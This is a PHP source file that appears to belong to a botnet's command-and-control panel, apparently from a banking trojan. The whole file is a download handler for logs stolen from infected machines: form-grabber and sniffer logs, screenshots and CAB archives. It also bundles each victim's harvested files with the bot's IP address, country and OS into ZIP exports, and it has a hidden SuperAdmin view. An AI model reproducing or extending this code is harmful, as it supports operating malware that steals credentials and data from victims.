<?php
error_reporting(0);
if(empty($Cur['id'])) exit;

switch($Cur['id']){
	/*
	case 1:
		if(!preg_match('~^([0-9.]+\.txt)$~is', $Cur['file'])){
		header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: text/plain");
	
		if(file_exists('logs/import/gra/' . $Cur['str'] . '/' . $Cur['file'])){
			if($Cur['type'] == 1) header( 'Content-Disposition: attachment; filename="' . $Cur['str'] . '_' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/import/gra/' . $Cur['str'] . '/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/import/gra/' . $Cur['str'] . '/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/import/gra/' . $Cur['str'] . '/' . $Cur['file']);
			}
		}
	break;

	case 2:
		if(!preg_match('~^([0-9.]+\.txt)$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: text/plain");

		if(file_exists('logs/import/fgr/' . $Cur['str'] . '/' . $Cur['file'])){
			if($Cur['type'] == 1) header( 'Content-Disposition: attachment; filename="' . $Cur['str'] . '_' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
			header( 'X-LIGHTTPD-send-file: ' . realpath('logs/import/fgr/' . $Cur['str'] . '/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
			header('X-Sendfile: ' . realpath('logs/import/fgr/' . $Cur['str'] . '/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/import/fgr/' . $Cur['str'] . '/' . $Cur['file']);
			}
		}
	break;

	case 3:
		if(!preg_match('~^([0-9.]+\.txt)$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: text/plain");
	
		if(file_exists('logs/import/sni/' . $Cur['str'] . '/' . $Cur['file'])){
			if($Cur['type'] == 1) header( 'Content-Disposition: attachment; filename="' . $Cur['str'] . '_' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/import/sni/' . $Cur['str'] . '/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/import/sni/' . $Cur['str'] . '/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/import/sni/' . $Cur['str'] . '/' . $Cur['file']);
			}
		}
	break;

	case 4:
		if(!preg_match('~^([0-9.]+\.txt)$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: text/plain");
	
		if(file_exists('logs/import/tra/' . $Cur['str'] . '/' . $Cur['file'])){
			if($Cur['type'] == 1) header( 'Content-Disposition: attachment; filename="' . $Cur['str'] . '_' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/import/tra/' . $Cur['str'] . '/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/import/tra/' . $Cur['str'] . '/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/import/tra/' . $Cur['str'] . '/' . $Cur['file']);
			}
		}
	break;
	*/
	
	case 5:
		if(!preg_match('~^([0-9.]+\.txt)$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: text/plain");
	
		if(file_exists('logs/bots/' . $Cur['str'] . '/' . $Cur['name'] . '/' . $Cur['file'])){
			if($Cur['type'] == 1) header( 'Content-Disposition: attachment; filename="' . $Cur['str'] . $Cur['name'] . '_' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/bots/' . $Cur['str'] . '/' . $Cur['name'] . '/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/bots/' . $Cur['str'] . '/' . $Cur['name'] . '/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/bots/' . $Cur['str'] . '/' . $Cur['name'] . '/' . $Cur['file']);
			}
		}
	break;

	case 6:
		if(!preg_match('~^([0-9]+)$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
	
		header("Content-Type: text/plain");
	
		$Cur['file'] = (int) $Cur['file'];
		if(!empty($Cur['file'])){
			@print(@base64_decode($mysqli->query_name('SELECT result FROM bf_search_result where (id = \''.$Cur['file'].'\') LIMIT 1', null, 'result')));
		}
	break;

	case 7:
		if(!preg_match('~^([a-zA-Z0-9_]+).cab$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: application/cab");
	
		if(file_exists('logs/diam/' . $Cur['file'])){
			header( 'Content-Disposition: attachment; filename="' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/diam/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/diam/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/diam/' . $Cur['file']);
			}
		}
	break;

	case 8:
		if(!preg_match('~^([a-zA-Z0-9_]+).jpeg$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: image/jpeg");
	
		if(file_exists('logs/screens/' . $Cur['file'])){
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/screens/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/screens/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/screens/' . $Cur['file']);
			}
		}
	break;

	case 9:
		if(!preg_match('~^([a-zA-Z0-9_]+).cab$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
		header("Content-Type: application/cab");
	
		if(file_exists('logs/cabs/' . $Cur['file'])){
			header( 'Content-Disposition: attachment; filename="' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/cabs/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/cabs/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/cabs/' . $Cur['file']);
			}
		}
	break;

	case 10:
		set_time_limit(0);
		ini_set('max_execution_time', 0);
	
		if(!preg_match('~^([a-zA-Z0-9]+)$~is', $Cur['str'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}else{
			$prefix = explode('0', $Cur['str'], 2);
			$uid = '0' . $prefix[1];
			$prefix = $prefix[0];
		}
	
		if(!preg_match('~^([A-Za-z0-9]+)$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
	
		if(empty($prefix) && empty($uid) && $db_name == false) exit($lang['lop']);
		if(!extension_loaded ('zip')) exit($lang['pmzny']);
	
		$file_name = 'cache/zips/' . $Cur['file'] . '_' . date('d.m.Y') . '_' . mt_rand('1111', '9999') . '.zip';
		file_put_contents($file_name, '');
		chmod($file_name, 0777);
		$file_name = realpath($file_name);
	
		if($_SESSION['hidden'] == 'on' && $_SESSION['user']->login == 'SuperAdmin'){
			$files = $mysqli->query('SELECT * FROM bf_cabs WHERE (type = \''.$Cur['file'].'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') ORDER by post_date ASC', null, null, false);
		}else{
			$files = $mysqli->query('SELECT * FROM bf_cabs WHERE (chk = \'0\') AND (type = \''.$Cur['file'].'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') ORDER by post_date ASC', null, null, false);
		}
		
		if(count($files) > 0){
			$zip = new ZipArchive;
			$res = $zip->open($file_name, ZIPARCHIVE::OVERWRITE);
			if($res === TRUE){
				$zip->addEmptyDir($Cur['file']);
				$zip->addEmptyDir($Cur['file'] . '/' . $Cur['str']);
				$zip->addEmptyDir($Cur['file'] . '/' . $Cur['str'] . '/cabs/');
				$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') LIMIT 1');
				if($bot->prefix == $prefix && $bot->uid == $uid){
					$file_content = '--Full Bot Info--' . "\r\n";
					$file_content .= 'Prefix: ' . $bot->prefix . "\r\n";
					$file_content .= 'UID: ' . $bot->uid . "\r\n";
					$file_content .= 'Country: ' . $bot->country . "\r\n";
					$file_content .= 'IP: ' . $bot->ip . "\r\n";
					$file_content .= 'OS: ' . $bot->os . "\r\n";
					$file_content .= 'Last date: ' . date('d.m.Y H.i.s', $bot->last_date) . "\r\n";
					$zip->addFromString($Cur['file'] . '/' . $Cur['str'] . '/info.txt', $file_content);
				}
	
				foreach($files as $fname){
					$zip->addFile('logs/cabs/' . $fname->file, $Cur['file'] . '/' . $Cur['str'] . '/cabs/' . $fname->file);
					$file_content = '--Info--' . "\r\n";
					$file_content .= 'Prefix: ' . $fname->prefix . "\r\n";
					$file_content .= 'UID: ' . $fname->uid . "\r\n";
					$file_content .= 'Country: ' . $fname->country . "\r\n";
					$file_content .= 'IP: ' . $fname->ip . "\r\n";
					$file_content .= 'Size: ' . $fname->size . "\r\n";
					$zip->addFromString($Cur['file'] . '/' . $Cur['str'] . '/cabs/' . $fname->file . '.txt', $file_content);
				}
				$zip->close();
	
				if(file_exists($file_name)) header('Location: /logs/download-12.html?file=' . basename($file_name));
			}else{
				exit($lang['lze']);
			}
		}else{
			exit($lang['lnncf']);
		}
	break;

	case '11':
        //
	break;

	case '12':
		if(!preg_match('~^([a-zA-Z0-9_.]+).zip$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
	
		header('Expires: 0');
		header("Pragma: public");
		header("Cache-Control: must-revalidate, post-check=0,pre-check=0");
		header('Content-Type: application/zip');
		header('Content-Length: ' . filesize('cache/zips/' . $Cur['file']));
		header('Content-Disposition: attachment; filename="' . basename($Cur['file']) . '"');
	
		if(file_exists('cache/zips/' . $Cur['file'])){
			header( 'Content-Disposition: attachment; filename="' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('cache/zips/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('cache/zips/' . $Cur['file']));
				//header('X-Accel-Redirect: /cache/zips/' . $Cur['file']);
			}
		}
	break;

	case 13:
		set_time_limit(0);
		ini_set('max_execution_time', 0);
		if(!preg_match('~^([A-Za-z0-9]+)$~is', $Cur['file'])){
			header("HTTP/1.1 404 Not Found");
			header("Status: 404 Not Found");
			exit;
		}
	
		if(!extension_loaded ('zip')) exit($lang['pmzny']);
	
		$file_name = 'cache/zips/' . $Cur['file'] . '_' . date('d.m.Y') . '_' . mt_rand('1111', '9999') . '.zip';
		file_put_contents($file_name, '');
		chmod($file_name, 0777);
		$file_name = realpath($file_name);
	
		if($_SESSION['hidden'] == 'on' && $_SESSION['user']->login == 'SuperAdmin'){
			$files = $mysqli->query('SELECT * FROM bf_cabs WHERE (type = \''.$Cur['file'].'\') ORDER by post_date ASC', null, null, false);
		}else{
			$files = $mysqli->query('SELECT * FROM bf_cabs WHERE (chk = \'0\') AND (type = \''.$Cur['file'].'\') ORDER by post_date ASC', null, null, false);
		}	
	
		if(count($files) > 0){
			$zip = new ZipArchive;
			$res = $zip->open($file_name, ZIPARCHIVE::OVERWRITE);
			if($res === TRUE){
				$zip->addEmptyDir($Cur['file']);
				foreach($files as $fname){
					if($c[$fname->prefix . $fname->uid] != true){
						$zip->addEmptyDir($Cur['file'] . '/' . $fname->prefix . $fname->uid);
						$zip->addEmptyDir($Cur['file'] . '/' . $fname->prefix . $fname->uid . '/cabs/');
						
						$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (prefix = \''.$fname->prefix.'\') AND (uid = \''.$fname->uid.'\') LIMIT 1');
						if($bot->prefix == $fname->prefix && $bot->uid == $fname->uid){
							$file_content = '--Full Bot Info--' . "\r\n";
							$file_content .= 'Prefix: ' . $bot->prefix . "\r\n";
							$file_content .= 'UID: ' . $bot->uid . "\r\n";
							$file_content .= 'Country: ' . $bot->country . "\r\n";
							$file_content .= 'IP: ' . $bot->ip . "\r\n";
							$file_content .= 'OS: ' . $bot->os . "\r\n";
							$file_content .= 'Last date: ' . date('d.m.Y H.i.s', $bot->last_date) . "\r\n";
							$zip->addFromString($Cur['file'] . '/' . $fname->prefix . $fname->uid . '/info.txt', $file_content);
						}
	
						$c[$fname->prefix . $fname->uid] = true;
					}
	
					$zip->addFile('logs/cabs/' . $fname->file, $Cur['file'] . '/' . $fname->prefix . $fname->uid . '/cabs/' . $fname->file);
					$file_content = '--Info--' . "\r\n";
					$file_content .= 'Prefix: ' . $fname->prefix . "\r\n";
					$file_content .= 'UID: ' . $fname->uid . "\r\n";
					$file_content .= 'Country: ' . $fname->country . "\r\n";
					$file_content .= 'IP: ' . $fname->ip . "\r\n";
					$file_content .= 'Size: ' . $fname->size . "\r\n";
					$zip->addFromString($Cur['file'] . '/' . $fname->prefix . $fname->uid . '/cabs/' . $fname->file . '.txt', $file_content);
				}
				$zip->close();
	
				if(file_exists($file_name)){
					header('Location: /logs/download-12.html?file=' . basename($file_name));
				}
			}else{
				exit($lang['lze']);
			}
		}else{
			exit($lang['lnncf']);
		}
	break;
	/*
	case 14:
		if(!preg_match('~^([0-9.]+\.txt)$~is', $Cur['file'])){
    		header("HTTP/1.1 404 Not Found");
    		header("Status: 404 Not Found");
    		exit;
    	}
    	header("Content-Type: text/plain");

		if(file_exists('logs/import/inj/' . $Cur['str'] . '/' . $Cur['file'])){
			if($Cur['type'] == 1) header( 'Content-Disposition: attachment; filename="' . $Cur['str'] . '_' . $Cur['file'] . '"');
			if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header( 'X-LIGHTTPD-send-file: ' . realpath('logs/import/inj/' . $Cur['str'] . '/' . $Cur['file']));
			}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
				header('X-Sendfile: ' . realpath('logs/import/inj/' . $Cur['str'] . '/' . $Cur['file']));
				//header('X-Accel-Redirect: /logs/import/fgr/' . $Cur['str'] . '/' . $Cur['file']);
			}
		}
	break;
	*/
}

exit;

?>